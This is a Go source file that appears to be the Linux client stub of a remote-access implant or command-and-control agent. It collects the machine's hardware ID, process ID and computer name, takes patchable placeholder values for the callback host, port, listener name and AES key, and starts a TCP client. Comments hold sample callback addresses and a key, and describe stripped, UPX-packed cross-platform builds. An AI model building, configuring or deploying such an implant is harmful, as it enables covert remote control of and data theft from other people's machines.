//go:build linux
// +build linux

package main

import (
	"main/PcInfo"
	Tcp "main/Socket/tcp"
	"strings"
)

// var host = "192.168.8.123" // assuming for the sake of example
// var port = "4000"

func main() {
	PcInfo.ProcessID = PcInfo.GetProcessID()
	PcInfo.HWID = PcInfo.GetHWID()
	PcInfo.ClrVersion = "1.0"
	PcInfo.GroupInfo = "Linux"
	PcInfo.ClientComputer = PcInfo.GetClientComputer()
	//Debug
	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
	Port := "PortAAAABBBBCCCCDDDD"
	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
	PcInfo.AesKey = "AeskAAAABBBBCCCC"
	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")

	//release

	// PcInfo.Host = "192.168.1.4"
	// PcInfo.Port = "6000"
	// PcInfo.ListenerName = "asddw"
	// PcInfo.AesKey = "QWERt_CSDMAHUATW"

	Tcp.Run_main()
}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
